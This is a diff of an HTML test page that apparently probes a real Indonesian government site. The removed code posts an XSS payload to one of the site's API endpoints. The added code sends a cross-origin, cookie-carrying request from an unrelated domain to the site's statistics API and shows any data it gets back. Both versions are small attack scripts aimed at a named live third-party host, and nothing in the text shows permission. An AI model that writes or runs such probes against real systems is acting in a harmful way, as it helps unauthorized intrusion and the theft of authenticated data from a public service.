@@ -4,27 +4,35 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Test</title>
+    <title>CORS Exploit Test</title>
 </head>
 <body>
-    <h1>XSS Injection Test</h1>
+    <h1>Testing CORS Exploit on pakmo.mojokertokota.go.id</h1>
 
-    <!-- JavaScript to inject XSS into the target -->
     <script>
-        // Simulate the injection of a malicious script into a vulnerable form or endpoint
-        let targetURL = "https://pakmo.mojokertokota.go.id/api/data";  // Change this to the vulnerable target URL
-        let xssPayload = "<script>alert('XSS Injected from pklraul.me!');</script>";
+        // Uji apakah server target mengizinkan permintaan dari domain tidak sah (pklraul.me)
+        let targetURL = "https://pakmo.mojokertokota.go.id/api/home/statistic";
 
-        // Sending the XSS payload to the target
         fetch(targetURL, {
-            method: 'POST',  // Assuming the vulnerable form is using POST method
+            method: 'GET', // Bisa diubah ke POST atau metode lain tergantung endpoint
+            credentials: 'include', // Jika API target menggunakan cookie untuk otentikasi
             headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: "data=" + encodeURIComponent(xssPayload)  // Injecting the XSS payload
+                'Origin': 'https://pklraul.me', // Meniru asal permintaan dari pklraul.me
+                'Accept': 'application/json, text/plain, */*',
+            }
         })
-        .then(response => response.json())
-        .then(data => console.log('Response from the target:', data))
+        .then(response => {
+            // Cek jika server mengizinkan akses dari asal yang tidak sah
+            if (response.ok) {
+                return response.json();
+            } else {
+                throw new Error('Request failed');
+            }
+        })
+        .then(data => {
+            console.log('Response from target:', data);
+            alert('Data from target: ' + JSON.stringify(data)); // Menampilkan data dari target dalam alert box
+        })
         .catch(err => console.error('Error:', err));
     </script>
 
